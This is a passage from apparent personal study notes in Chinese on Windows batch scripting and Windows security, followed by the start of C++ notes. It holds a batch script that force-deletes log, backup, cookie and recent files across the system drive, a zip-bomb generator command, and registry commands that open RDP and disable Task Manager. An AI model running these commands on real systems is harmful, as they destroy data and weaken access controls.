class="built_in">start</span>)</span><br><span class="line">:end</span><br><span class="line"><span class="built_in">echo</span> <span class="keyword">exit</span></span><br><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure><h4 id="12-5-清除C盘垃圾"><a href="#12-5-清除C盘垃圾" class="headerlink" title="12.5 清除C盘垃圾"></a>12.5 清除C盘垃圾</h4><blockquote><p>慎用，可能会删除C盘所有东西</p></blockquote><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">tip：</span><br><span class="line"><span class="variable">%userprofile%</span>\recent：最近访问文件记录的文件夹</span><br><span class="line"><span class="variable">%userprofile%</span>\cookies：删除cookies</span><br><span class="line">systemdrive=C:</span><br><span class="line">windir=C:\windows</span><br><span class="line">userprofile=C:\Users\Adminstrator</span><br><span class="line"></span><br><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">echo</span> <span class="built_in">del</span> temp!</span><br><span class="line"><span class="built_in">del</span> /f /s /q <span class="variable">%systemdrive%</span>\*.tmp</span><br><span class="line"><span class="built_in">del</span> /f /s /q <span class="variable">%windir%</span>\prefetch\*.* <span class="built_in">rd</span> /s /q <span class="variable">%windir%</span>\temp &amp; <span class="built_in">md</span> <span class="variable">%windir%</span>\temp</span><br><span class="line"><span class="built_in">del</span> /f /s /q &quot;<span class="variable">%userprofile%</span>\Local Settings\Temp\*.*&quot;</span><br><span class="line"><span class="built_in">del</span> /f /s /q <span class="variable">%systemdrive%</span>\*._mp</span><br><span class="line"><span class="built_in">del</span> /f /s /q <span class="variable">%windir%</span>\*.bak</span><br><span class="line"><span class="built_in">del</span> /f /s /q <span class="variable">%systemdrive%</span>\*.log</span><br><span class="line"><span class="built_in">del</span> /f /s /q <span class="variable">%systemdrive%</span>\*.gid</span><br><span class="line"><span class="built_in">del</span> /f /s /q <span class="variable">%systemdrive%</span>\*.chk</span><br><span class="line"><span class="built_in">del</span> /f /s /q <span class="variable">%systemdrive%</span>\*.old</span><br><span class="line"><span class="built_in">del</span> /f /s /q <span class="variable">%systemdrive%</span>\recycled\*.*</span><br><span class="line"><span class="built_in">del</span> /f /q <span class="variable">%userprofile%</span>\cookies\*.*</span><br><span class="line"><span class="built_in">del</span> /f /q <span class="variable">%userprofile%</span>\recent\*.*</span><br><span class="line"><span class="built_in">del</span> /f /q &quot;<span class="variable">%userprofile%</span>\Local Settings\Temporary Internet Files\*.*</span><br><span class="line"><span class="built_in">del</span> /f /s /q &quot;%userprofile&quot;\recent\*.*&quot;</span><br><span class="line"><span class="built_in">echo</span> end!</span><br><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure><h4 id="12-6-win10添加本地用户和组策略"><a href="#12-6-win10添加本地用户和组策略" class="headerlink" title="12.6 win10添加本地用户和组策略"></a>12.6 win10添加本地用户和组策略</h4><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">pushd</span> &quot;%~dp0&quot;</span><br><span class="line"><span class="built_in">dir</span> /b C:\Windows\servicing\Packages\Microsoft-Windows-GroupPolicy-ClientExtensions-Package~<span class="number">3</span>*.mum &gt;List.txt</span><br><span class="line"><span class="built_in">dir</span> /b C:\Windows\servicing\Packages\Microsoft-Windows-GroupPolicy-ClientTools-Package~<span class="number">3</span>*.mum &gt;&gt;List.txt</span><br><span class="line"><span class="keyword">for</span> /f <span class="variable">%%i</span> <span class="keyword">in</span> (&#x27;<span class="built_in">findstr</span> /i . List.txt <span class="number">2</span>^&gt;<span class="built_in">nul</span>&#x27;) <span class="keyword">do</span> dism /online /norestart /add-package:&quot;C:\Windows\servicing\Packages\<span class="variable">%%i</span>&quot;</span><br><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure><h4 id="12-7-压缩包炸弹"><a href="#12-7-压缩包炸弹" class="headerlink" title="12.7 压缩包炸弹"></a>12.7 压缩包炸弹</h4><blockquote><p><a href="https://www.123pan.com/s/giw9-0gRwd">项目位置</a></p><p><a href="https://www.bilibili.com/video/BV1cP411F7jF/">视频演示</a></p><p>pythoon zipbomb.py —mode=quoted_overlap —num-files=num —compressed-size=size &gt; new.zip</p></blockquote><h4 id="12-8-映像劫持"><a href="#12-8-映像劫持" class="headerlink" title="12.8 映像劫持"></a>12.8 映像劫持</h4><blockquote><p><a href="https://space.bilibili.com/493998035">https://space.bilibili.com/493998035</a></p></blockquote><hr><h2 id="四、Windows安全"><a href="#四、Windows安全" class="headerlink" title="四、Windows安全"></a>四、Windows安全</h2><blockquote><p><a href="https://www.bilibili.com/video/BV1Zi4y1b7Qv">author::视频</a></p></blockquote><h3 id="1-Windows-Server"><a href="#1-Windows-Server" class="headerlink" title="1 Windows Server"></a>1 Windows Server</h3><blockquote><p>专门用于服务器</p></blockquote><h3 id="2-用户路径"><a href="#2-用户路径" class="headerlink" title="2 用户路径"></a>2 用户路径</h3><ul><li><p>用户开机自启动路径</p><blockquote><p>C:\Users\username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</p></blockquote></li></ul><h3 id="3-文件分类"><a href="#3-文件分类" class="headerlink" title="3 文件分类"></a>3 文件分类</h3><ul><li><p>系统文件</p><blockquote><p>由系统软件构成的文件。大多数的系统文件只允许用户去调用但不允许用户读改，有的甚至不对用户开放。</p></blockquote></li><li><p>用户文件</p><blockquote><p>指由用户的源代码（.c）、目标文件（.obj）、可执行文件（.exe）、数据等所构成的文件。用户将这些文件委托给系统保管。</p></blockquote></li><li><p>库文件</p><blockquote><p>由标准子例程及常用的例程等所构成的文件。这类文件运行用户调用，但不允许修改。（如.dll）</p></blockquote></li></ul><h3 id="4-文件系统"><a href="#4-文件系统" class="headerlink" title="4 文件系统"></a>4 文件系统</h3><ul><li><p>FAT系统</p><blockquote><p><a href="https://baike.sogou.com/v459447.htm?fromTitle=FAT文件系统&amp;ch=frombaikevr">FAT系统</a></p><p>FAT是File Allocation Table的缩写，即文件分配表。</p></blockquote></li><li><p>NTFS系统</p><blockquote><p>安全，先进，Windows特有的。</p></blockquote></li><li><p>FAT系统和NTFS系统区别<img src="/posts/3bb1b741/FAT和NTFS.jpg" alt="img"></p></li><li><p>光盘文件系统</p><ul><li><p>UDF</p><blockquote><p>UDF是统一光盘格式的缩写。采用标准的封装写入技术将CD-R当作硬盘来用，可在光盘上修改和删除文件。其基本原理是在进行烧录时先将数据打包，并在内存中临时建立一个特殊的文件目录表，同时接管系统对光盘的访问。</p></blockquote></li><li><p>CDFS</p><blockquote><p>Compact Disc File System，是一种适合<a href="https://baike.sogou.com/lemma/ShowInnerLink.htm?lemmaId=205061&amp;ss_c=ssc.citiao.link">光存储</a>的文件系统，是用于光盘和光盘镜像的文件系统。</p></blockquote></li></ul></li></ul><h3 id="5-Windows-Server-用户和组"><a href="#5-Windows-Server-用户和组" class="headerlink" title="5 Windows Server 用户和组"></a>5 Windows Server 用户和组</h3><h4 id="5-1-组"><a href="#5-1-组" class="headerlink" title="5.1 组"></a>5.1 组</h4><ul><li><p>Administrators</p><blockquote><p>组内账户有管理员权限，对计算机有最大控制权限，内置的系统管理员账户Administrator就是本地组成员，且无法把它从该组删除。默认无密码。</p></blockquote></li><li><p>Guests</p><blockquote><p>组内账号是没有用户信息、但需要访问本地计算机内资源的用户使用，该组的成员无法永久地改变其桌面的工作环境。常见默认成员为Guest。默认无密码。</p></blockquote></li><li><p>Users</p><blockquote><p>基本权利，比Guests强，新加的本地用户自动属于该组。</p></blockquote></li><li><p>Remote Desktop Users</p><blockquote><p>该组成员可以通过远程计算机登录。权限小于Users组账户高于Guests组账户，默认无法本地登录。</p></blockquote></li><li><p>Event Log Readers</p><blockquote><p>该组成员可以从本地计算机中读取事件日志。</p></blockquote></li></ul><h4 id="5-2-访问控制"><a href="#5-2-访问控制" class="headerlink" title="5.2 访问控制"></a>5.2 访问控制</h4><p><img src="/posts/3bb1b741/访问控制.jpg" alt></p><ul><li><p>访问控制列表（Access Control List）</p><blockquote><p>访问权限决定着某个用户可以访问的文件和目录。</p></blockquote></li><li><p>安全描述符（SD)</p><blockquote><p>规定了文件和文件夹的安全数据。</p><p>安全描述符决定安全设置是否只对当前目录有效，或者可以传递给其他文件和目录。</p></blockquote></li><li><p>SD组成</p><ul><li><p>SID（安全标识符）</p><blockquote><p>安全标识符(Security Identifier，SID)</p><p>每个用户和账户组都有一个唯一的SID（通常情况下唯一），它是标识用户、用户组和计算机账户唯一的号码、由计算机名、当前时间、当前用户线程的CPU耗费时间，三个参数确定。</p><p>帐号创建时同时被创建，一旦帐号被删除，安全标识同时也被删除。</p><p>安全标识是唯一的，即使是相同的用户名，每次创建时获得的安全标识都是完全不同的。</p><p>查看sid：<code>sc showsid server</code></p></blockquote></li><li><p>ACE（访问控制项）</p><blockquote><p>指访问控制实体，用于指定特定用户组的访问权限，是权限控制的最小单位。</p><p>ACE三种类型：拒绝访问、允许访问、系统审核（受信者访问对象时产生审核记录）</p></blockquote></li><li><p>ACL（访问控制列表）</p><blockquote><p>是Windows中表示用户（组）权限的列表，ACL包含两种类型。一个是DACL（自主），一个是SACL（系统）。</p></blockquote></li></ul></li><li><p>UAC</p><blockquote><p>用户账户控制</p><p>是为了解决需要管理特权的应用程序问题，让最终用户配置为本地管理员。</p></blockquote></li></ul><h4 id="5-3-账户策略"><a href="#5-3-账户策略" class="headerlink" title="5.3 账户策略"></a>5.3 账户策略</h4><ul><li><p>组（gpedit.msc）</p><blockquote><p>计算机配置——Windows设置——安全设置——账户策略——…</p></blockquote></li><li><p>密码策略</p><blockquote><p>决定密码的设置，如强制性和期限。（使用期限：最短大于最长将永不过期）</p><p>账户锁定策略：决定系统锁定账户的时间，以及锁定谁的账户</p></blockquote></li><li><p>计算机配置——Windows设置——安全设置——本地策略——…</p><ul><li>审核策略：审核管理</li><li>用户权限分配：本地权限</li><li>安全选项：网络安全</li></ul></li></ul><h4 id="5-4-端口"><a href="#5-4-端口" class="headerlink" title="5.4 端口"></a>5.4 端口</h4><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">查看端口：netstat -ano | <span class="built_in">find</span> &quot;:port&quot;</span><br><span class="line">查看进程：tasklist | <span class="built_in">find</span> &quot;pid&quot;</span><br></pre></td></tr></table></figure><ul><li><p>http：80</p><blockquote><p>建议：关闭80端口（提供web服务可以进行端口映射）</p></blockquote></li><li><p>https：443</p><blockquote><p>建议：不发布网站建议关闭该协议。</p></blockquote><ul><li>https步骤<ol><li>客户端发起HTTPS请求</li><li>服务端配置</li><li>传送证书</li><li>客户端解析证书</li><li>传送加密信息</li><li>服务端解密信息</li><li>传输加密后的信息</li><li>客户端解密信息</li></ol></li></ul></li><li><p>DNS：53</p><blockquote><p>基于UDP</p><p>攻击：DNS污染（域名对应错误IP）</p></blockquote></li><li><p>DHCP：67（Server）/68（Client）</p><blockquote><p>67：接收下级客户请求分配IP</p><p>68：向客户发请求成功或失败的回应</p><ul><li>自动分配方式：DHCP服务器为主机指定一个永久性的IP地址</li><li>动态分配方式：DHCP服务器给主机指定一个具有时间限制的IP地址</li><li>手工分配方式：客户端的IP地址是由网络管理员指定的IP地址</li><li>攻击：DHCP欺骗（将IP获取完后自己搭建一个DHCP服务器将用户引入错误的网站）</li></ul></blockquote></li><li><p>SMTP：25</p><blockquote><ul><li>Web界面：A —[http]—ISPServer—[SMTP]—ISPServer—[http]— B</li><li>客户端：A —[SMTP]—ISPServer—[SMTP]—ISPServer—[POP3/IMAP]— B</li><li>攻击：垃圾邮件，端口攻击</li></ul></blockquote></li><li><p>POP3：110</p><blockquote><p>主要用于支持客户端远程管理在服务器上的电子邮件，但该协议是明文传输。</p></blockquote></li><li><p>IMAP：143</p><blockquote><p>直接对服务器的邮件进行操作。</p><p>建议：加入SSL协议保证安全，加入后POP3S：995，IMAPS：993，SMTPS：465/994</p></blockquote></li><li><p>FTP：21</p></li><li><p>Telnet：23</p></li><li><p>远程桌面：3389</p><blockquote><p>改端口号：</p><ol><li>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp\PortNumber</li><li>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\PortNumber</li></ol></blockquote></li><li><p>PRC：135</p><blockquote><p>远程过程调用：分布式计算</p></blockquote></li><li><p>NetBIOS：139</p><blockquote><p>常见故障：弱连接，永恒之蓝</p></blockquote></li></ul><h4 id="5-5-系统日志"><a href="#5-5-系统日志" class="headerlink" title="5.5 系统日志"></a>5.5 系统日志</h4><blockquote><p>日志查看器（ eventvwr.msc ）</p></blockquote><ul><li><p>应用程序日志</p><blockquote><p>%SystemRoot%\System32\winevt\Logs\Application.evtx</p><p>记录操作系统组件产生的事件，例：驱动程序，系统组件，应用崩溃，数据丢失错误。</p></blockquote></li><li><p>系统日志</p><blockquote><p>%SystemRoot%\System32\winevt\Logs\System.evtx</p><p>记录应用程序和系统程序产生的事件，例：记录程序错误，开发人员自定义，处理程序调试。</p></blockquote></li><li><p>安全日志</p><blockquote><p>%SystemRoot%\System32\winevt\Logs\Security.evtx</p><p>记录安全审计事件，例：登录日志，对象访问日志，进程追踪日志，特权使用，账号管理，策略变更。</p></blockquote></li><li><p>分析工具</p><ul><li>Log Parser</li><li>LogParser Lizard</li><li>Event Log Explorer</li></ul></li></ul><h4 id="5-6-日志分析"><a href="#5-6-日志分析" class="headerlink" title="5.6 日志分析"></a>5.6 日志分析<img src="/posts/3bb1b741/日志ID.jpg" alt="img"><img src="/posts/3bb1b741/登录类型.jpg" alt="img"></h4><h4 id="5-7-WSUS：辅助补丁服务器"><a href="#5-7-WSUS：辅助补丁服务器" class="headerlink" title="5.7 WSUS：辅助补丁服务器"></a>5.7 WSUS：辅助补丁服务器</h4><h4 id="5-8-注册表安全"><a href="#5-8-注册表安全" class="headerlink" title="5.8 注册表安全"></a>5.8 注册表安全</h4><blockquote><p>注册表编辑器：regedit / regedt32</p></blockquote><ul><li><p>注册表路径</p><blockquote><p>%systemroot%\system32\config\</p></blockquote><ul><li><p>DEFAULT</p><blockquote><p>..\HKEY_USERS.DEFAULT</p></blockquote></li><li><p>SAM</p><blockquote><p>安全账号管理</p><p>..\HKEY_LOCAL_MACHINE\SAM</p></blockquote></li><li><p>SECURITY</p><blockquote><p>..\HKEY_LOCAL_MACHINE\Security</p></blockquote></li><li><p>SOFTWARE</p><blockquote><p>..\HKEY_LOCAL_MACHINE\Software</p></blockquote></li><li><p>SYSTEM</p><blockquote><p>..\HKEY_LOCAL_MACHINE\System\HKEY_CURRENT_CONFIG</p></blockquote></li><li><p>NTUSER.DAT</p><blockquote><p>用户配置文件</p><p>..\HKEY_CURRENT_USER</p></blockquote></li></ul></li><li><p>注册表的五个一级分支：</p><ul><li><p>HKEY<em>CLASSES</em> ROOT</p><blockquote><p>存储Windows可识别的文件类型的详细列表，及相关联的程序</p></blockquote></li><li><p>HKEY_CURRENT_USER</p><blockquote><p>存储当前用户设置的信息</p></blockquote></li><li><p>HKEY_LOCAL_MACHINE</p><blockquote><p>包括安装在计算机上的硬件和软件的信息</p></blockquote></li><li><p>HKEY_USERS</p><blockquote><p>包含使用计算机的用户的信息</p></blockquote></li><li><p>HKEY_CURRENT_CONFIG</p><blockquote><p>这个分支包含计算机当前的硬件配置信息</p></blockquote></li></ul></li><li><p>案例：</p><ul><li><p>win2008开启RDP</p><blockquote><p>reg add HKLM\STSTEM\CurrentControlSet\Control\Terminal” “Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</p></blockquote></li><li><p>win2008查RDP端口</p><blockquote><p>reg query HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server\WinStations\RDP-Tcp /v PortNumber</p></blockquote></li><li><p>修改win服务远程端口</p><blockquote><p>[ HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp ]<br>[ HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp ]</p></blockquote></li><li><p>禁用任务管理器</p><blockquote><p>[ HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System（新建项）\DisableTaskmgr（新建DWORD值） ] = 1</p></blockquote></li><li><p>修改IE主页</p><blockquote><p>[ HEKY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\MAIN\Default_Page_URL ] = url</p></blockquote></li></ul></li></ul><h3 id="6-AD域"><a href="#6-AD域" class="headerlink" title="6 AD域"></a>6 AD域</h3><h4 id="6-1-AD域的概念"><a href="#6-1-AD域的概念" class="headerlink" title="6.1 AD域的概念"></a>6.1 AD域的概念</h4><blockquote><p>域是windows网络中独立运行的基本单位。</p><p>Active Directory（活动目录）：是微软Windows Server中负责架构中大型网络环境的集中式目录管理服务（Directory Services）</p><p>工作组：本地，独立，分散的管理模式</p><p>域模式：主从管理</p></blockquote><h4 id="6-2-信任关系"><a href="#6-2-信任关系" class="headerlink" title="6.2 信任关系"></a>6.2 信任关系</h4><blockquote><p>信任关系：A信任B，B可以在身份认证后访问A的资源</p><p>被信任关系：与信任关系相反</p></blockquote><h4 id="6-3-管理"><a href="#6-3-管理" class="headerlink" title="6.3 管理"></a>6.3 管理</h4><blockquote><p>组策略</p></blockquote><h3 id="7-基线配置"><a href="#7-基线配置" class="headerlink" title="7 基线配置"></a>7 基线配置</h3><h4 id="7-1-身份鉴别"><a href="#7-1-身份鉴别" class="headerlink" title="7.1 身份鉴别"></a>7.1 身份鉴别</h4><blockquote><p>SAM：%SystemRoot%\system32\config\sam：相当于Linux中的shadow</p><p><code>wmic useraccount get name,sid</code>：查看 name 和 sid（尾 500 是 admin，501 是 guest）</p></blockquote><ul><li><p>更改本地安全设置保证安全</p><ul><li><p>本地组和用户——用户</p><blockquote><p>admin 修改名称，guest 禁用（属性——常规）</p></blockquote></li><li><p>本地安全策略——密码</p><blockquote><p>复杂性，不小于8位，口令小于90天，5次密码重复设定，6次失败认证锁定，锁定长于1分钟，复位设定，到期两周前提醒。</p></blockquote></li><li><p>本地安全策略——本地策略——网络访问</p><blockquote><p>不允许枚举SAM账号和共享的枚举。</p></blockquote></li><li><p>本地安全策略——本地策略——安全选项</p><blockquote><p>域成员禁止更改机器账户密码。</p></blockquote></li></ul></li></ul><h4 id="7-2-访问控制"><a href="#7-2-访问控制" class="headerlink" title="7.2 访问控制"></a>7.2 访问控制</h4><ul><li><p>计算机管理——本地组和用户——用户</p><blockquote><p>共享账户检查</p></blockquote></li><li><p>本地安全设置——本地策略——用户权限分配</p><blockquote><p>关机权限（只给admin，本地和远程关机）</p></blockquote></li><li><p>本地安全设置——本地策略——用户权限分配</p><blockquote><p>文件权限（只给damin，取得文件或其他对象的所有权）</p></blockquote></li><li><p>本地安全设置——本地策略——用户权限分配</p><blockquote><p>账户本地登录</p></blockquote></li><li><p>本地安全设置——本地策略——用户权限分配</p><blockquote><p>账户网络访问（只给特定用户）</p></blockquote></li><li><p>关闭默认共享</p><blockquote><p>注册表——HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanmanServer\Parameters\——增加AutoShareServer( type : REG_DWORD , value : 0 )</p></blockquote></li><li><p>计算机管理——共享文件夹——共享</p><blockquote><p>设置共享（不设置为 everyone）</p></blockquote></li><li><p>服务——开启时间服务</p><blockquote><p>NTP服务（用于同步网络中服务器与客户端的时间）</p></blockquote></li><li><p>windows文件权限</p><blockquote><p>直接设置大于继承，拒绝大于允许。<br>移动、复制对权限继承性的影响：</p><ol><li>在同一分区内移动文件或文件夹，权限保持不变。在不同分区间移动文件或文件夹，权限继承新位置的权限。</li><li>复制文件或文件夹，权限会继承新位置的权限。</li><li>把文件或文件夹移动或复制到 FAT 分区中时权限会丢失。</li></ol></blockquote></li></ul><h4 id="7-3-安全审计"><a href="#7-3-安全审计" class="headerlink" title="7.3 安全审计"></a>7.3 安全审计</h4><h4 id="7-4-资源控制"><a href="#7-4-资源控制" class="headerlink" title="7.4 资源控制"></a>7.4 资源控制</h4><h4 id="7-5-剩余信息保护"><a href="#7-5-剩余信息保护" class="headerlink" title="7.5 剩余信息保护"></a>7.5 剩余信息保护</h4><h4 id="7-6-入侵防范"><a href="#7-6-入侵防范" class="headerlink" title="7.6 入侵防范"></a>7.6 入侵防范</h4><h4 id="7-7-恶意代码防范"><a href="#7-7-恶意代码防范" class="headerlink" title="7.7 恶意代码防范"></a>7.7 恶意代码防范</h4><hr><h2 id="五、Winodws综合实践"><a href="#五、Winodws综合实践" class="headerlink" title="五、Winodws综合实践"></a>五、Winodws综合实践</h2><h3 id="1-巧用Windows事件日志“隐藏”载荷"><a href="#1-巧用Windows事件日志“隐藏”载荷" class="headerlink" title="1 巧用Windows事件日志“隐藏”载荷"></a>1 <a href="https://xz.aliyun.com/t/12251">巧用Windows事件日志“隐藏”载荷</a></h3><h3 id="2-同步网络时间"><a href="#2-同步网络时间" class="headerlink" title="2 同步网络时间"></a>2 同步网络时间</h3><blockquote><p><a href="https://blog.csdn.net/weixin_43673589/article/details/109144725">bat同步时间</a></p><p><a href="https://blog.csdn.net/lxfhahaha/article/details/72640551">bat同步时间</a></p></blockquote><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"># 停时间服务</span><br><span class="line"><span class="built_in">net</span> stop w32time</span><br><span class="line"># 开时间服务</span><br><span class="line"><span class="built_in">net</span> <span class="built_in">start</span> w32time</span><br><span class="line"># 同步时钟</span><br><span class="line">w32tm /resync</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 操作系统安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> 计算机系统 </tag>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++</title>
      <link href="/posts/5751eea2.html"/>
      <url>/posts/5751eea2.html</url>
      
        <content type="html"><![CDATA[<h1 id="C"><a href="#C" class="headerlink" title="C++"></a>C++</h1><blockquote><p><a href=".\4b0178e0">text::数据结构与算法</a></p></blockquote><hr><h2 id="一、C语言"><a href="#一、C语言" class="headerlink" title="一、C语言"></a>一、C语言</h2><h3 id="1-变量"><a href="#1-变量" class="headerlink" title="1 变量"></a>1 变量</h3><h3 id="2-运算符"><a href="#2-运算符" class="headerlink" title="2 运算符"></a>2 运算符</h3><h3 id="3-输入输出"><a href="#3-输入输出" class="headerlink" title="3 输入输出"></a>3 输入输出</h3><blockquote><p><a href="https://www.cnblogs.com/wucongzhou/p/12498790.html#3对齐标志flags">格式化输出</a></p></blockquote><h3 id="4-判断"><a href="#4-判断" class="headerlink" title="4 判断"></a>4 判断</h3><h3 id="5-循环"><a href="#5-循环" class="headerlink" title="5 循环"></a>5 循环</h3><h3 id="6-数组"><a href="#6-数组" class="headerlink" title="6 数组"></a>6 数组</h3><h3 id="7-函数"><a href="#7-函数" class="headerlink" title="7 函数"></a>7 函数</h3><blockquote><p>exit 函数：<a href="https://www.cnblogs.com/shuopython/p/15318764.html">链接</a></p></blockquote><h3 id="8-文件"><a href="#8-文件" class="headerlink" title="8 文件"></a>8 文件</h3><h3 id="9-指针"><a href="#9-指针" class="headerlink" title="9 指针"></a>9 指针</h3><h3 id="10-结构体"><a href="#10-结构体" class="headerlink" title="10 结构体"></a>10 结构体</h3><blockquote><p>结构体指针使用（先要指向一个结构体）</p></blockquote><h3 id="11-内存"><a href="#11-内存" class="headerlink" title="11 内存"></a>11 内存</h3><h3 id="12-define"><a href="#12-define" class="headerlink" title="12 define"></a>12 define</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> x 5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> a x+x</span></span><br><span class="line">cout &lt;&lt; a*a &lt;&lt; endl;</span><br><span class="line"><span class="comment">// 输出35，因为实际上是表达式拼接，所以是输出x+x*x+x的值。</span></span><br></pre></td></tr></table></figure><hr><h2 id="二、C-基础"><a href="#二、C-基础" class="headerlink" title="二、C++基础"></a>二、C++基础</h2><h3 id="0-工程包含"><a href="#0-工程包含" class="headerlink" title="0 工程包含"></a>0 工程包含</h3><blockquote><p>多个cpp包含同一个头文件。</p><p>头文件中有#pragma once且只有声明，不能有定义，否则会多次包含。</p><ul><li>extern int a：全局声明。</li><li>int a：定义。</li></ul></blockquote><h3 id="1-基本使用"><a href="#1-基本使用" class="headerlink" title="1 基本使用"></a>1 基本使用</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;    <span class="comment">// stdio.h</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Hello C++&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="comment">//std::cout &lt;&lt; &quot;Hello World!\n&quot;;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//使用命名空间，否则就是 namespace::function 使用</span></span><br></pre></td></tr></table></figure><h3 id="2-变量"><a href="#2-变量" class="headerlink" title="2 变量"></a>2 变量</h3><blockquote><p>大部分同C语言。</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//必须带 f ，否则会变成 double 类型</span></span><br><span class="line"><span class="type">float</span> f1 = <span class="number">3.14f</span>;</span><br><span class="line"><span class="comment">//字符串类型 使用前应包含&lt; string &gt;头文件（VS2022不用）</span></span><br><span class="line">std::string str2 = <span class="string">&quot;&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="3-运算符"><a href="#3-运算符" class="headerlink" title="3 运算符"></a>3 运算符</h3><blockquote><p>同C。</p></blockquote><h3 id="4-输入输出"><a href="#4-输入输出" class="headerlink" title="4 输入输出"></a>4 输入输出</h3><blockquote><p><a href="https://blog.csdn.net/weixin_41042404/article/details/80934191">输入带空格</a></p><p><a href="https://blog.csdn.net/u013594490/article/details/92779827">输入被跳过问题</a></p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="comment">//输入（同C：空格截断）</span></span><br><span class="line">cin &gt;&gt; ( scanf ) ; </span><br><span class="line"></span><br><span class="line"><span class="comment">//输出</span></span><br><span class="line"><span class="comment">//( print )是输出结果，例：cout &lt;&lt; &quot;a=&quot;&lt;&lt; a &lt;&lt; &quot;,b=&quot; &lt;&lt; b &lt;&lt; endl; </span></span><br><span class="line"><span class="comment">//endl：以换行结束，ends：不以换行结束。</span></span><br><span class="line">cout &lt;&lt; (print) &lt;&lt; endl ;    </span><br><span class="line"></span><br><span class="line"><span class="comment">//带空格输入（string中前一个函数是将cin的残留回车符清除。）</span></span><br><span class="line"><span class="type">char</span>[]带空格：cin.<span class="built_in">get</span>(arr,len);</span><br><span class="line">string带空格：cin.<span class="built_in">ignore</span>(); <span class="built_in">getline</span>(cin,str);  </span><br></pre></td></tr></table></figure><h3 id="5-判断"><a href="#5-判断" class="headerlink" title="5 判断"></a>5 判断</h3><blockquote><p>同C。</p></blockquote><h3 id="6-循环"><a href="#6-循环" class="headerlink" title="6 循环"></a>6 循环</h3><blockquote><p>同C。</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//goto语句（同汇编）：</span></span><br><span class="line">label: </span><br><span class="line"><span class="keyword">goto</span>  label;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 迭代获得str中的值给x，带了引用表示对x的操作会影响str值，不带则不会影响</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">auto</span> x:str);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">auto</span>&amp; x:str);</span><br></pre></td></tr></table></figure><h3 id="7-数组"><a href="#7-数组" class="headerlink" title="7 数组"></a>7 数组</h3><blockquote><p>同C。</p></blockquote><h3 id="8-函数"><a href="#8-函数" class="headerlink" title="8 函数"></a>8 函数</h3><blockquote><p>同C。</p></blockquote><ul><li><p>默认参数</p><ol><li>不同于python，默认参数之后的参数都必修是默认参数，输入值时不可以指定参数的位置（例不可以：fun( b = 10) ; ）</li><li>函数在声明和实现中只能有一处有默认参数。</li></ol></li><li><p>占位参数</p><ol><li>传值时必须传值，但是该值不会被使用（暂时）（例：void fun ( int a , int )）</li><li>占位参数也可以是默认参数（例：void fun ( int a , int  = 10 )）</li></ol></li><li><p>函数重载</p><ol><li>参数是( int&amp; a) 和 ( const int&amp; a )：func(a)是第一个，func(10)是第二个。</li><li>默认参数容易出现二义性。</li></ol></li></ul><h3 id="9-文件"><a href="#9-文件" class="headerlink" title="9 文件"></a>9 文件</h3><h3 id="10-异常"><a href="#10-异常" class="headerlink" title="10 异常"></a>10 异常</h3><blockquote><p><a href="https://blog.csdn.net/wohu1104/article/details/108188965">链接</a></p></blockquote><h3 id="11-指针"><a href="#11-指针" class="headerlink" title="11 指针"></a>11 指针</h3><blockquote><p>同C</p><p>指针占地址：所有数据类型的指针，x86是4B，x64是8B</p><p>常量指针：指针的指向可以改，指针指向的值不能被修改。（例：<code>const int *p = &amp;a;</code>）<br>指针常量：指针的指向不可以改，指针指向的值可以改。（例：<code>int * const p = &amp;a;</code> ）<br>const既修饰指针又修饰常量：都不可以改。（例：<code>const int * const p = &amp;a;</code>）</p></blockquote><h3 id="12-结构体"><a href="#12-结构体" class="headerlink" title="12 结构体"></a>12 结构体</h3><blockquote><p>同C</p><p>默认访问权限是公有。</p></blockquote><h3 id="13-内存"><a href="#13-内存" class="headerlink" title="13 内存"></a>13 